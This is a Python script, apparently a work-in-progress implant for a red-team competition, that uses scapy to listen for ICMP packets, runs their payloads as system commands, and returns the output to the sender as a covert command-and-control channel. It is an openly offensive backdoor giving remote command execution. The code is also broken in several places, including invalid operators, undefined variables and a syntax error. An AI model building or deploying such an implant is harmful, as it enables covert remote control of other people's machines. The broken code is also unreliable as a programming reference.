from scapy.all import *
import subprocess as sp
import threading
import sys
import socket
import random

cmn_cmds = []
verbose = False
ip=socket.gethostbyname(socket.gethostname())  
mayday = False
"""This is the only way I can thing to pass a file name from one if to aother
There might be a better way to accomplish this but this is the only way I can come up with at the current moment
"""

def cmd_mon(pkt):
    typ = str(pkt.getlayer(ICMP).type)
    code = str(pkt.getlayer(ICMP).code)
    source = pkt.getlayer(IP).src
    cmd_proc(typ, code, source)

    
def cmd_proc(typ, code, source):
    if typ >= 44 && typ <= 94:
        instruct = pkt.getlayer(ICMP).load.decode()
        result = sp.run(cmd, capture_output=True)
        if result.check_returncode() is None and verbose:
            print(result.stdout.decode())
        send_output(result.stdout.decode(), source)

def breakup(data):
    broken = []

    

def send_output(stdout, sender):
    send(IP(dst=sender)/ICMP()/stdout)
    print("sent to C2")


""" May have to be from the server due to the fact that ping will be blocked in a competition on the inbound traffic 
Or just checking to see if a response is recieved. IDK honestly. Gotta spend time drawing this out 
"""
def heart():
    n = 1
    print("TheLoaded RICK")
    #while True:
    send(IP(dst="127.0.0.1")/ ICMP(type=) / "test")
    print("BEAT" + str(n))
    n += 1
    #time.sleep(15)

def sniffer():
    sniff(filter="icmp", prn=cmd_mon)

def main():
    global verbose
    try:
        if sys.argv[1] == "-v":
            verbose = True
    finally:
        print("Loaded Rick")
        #t1 = threading.Thread(target=heart)
        t2 = threading.Thread(target=sniffer)
        #t1.start()
        t2.start()
        #t1.join()
        t2.join()

#cmd_proc("ep Get-LocalUser -Name Guest")
main()
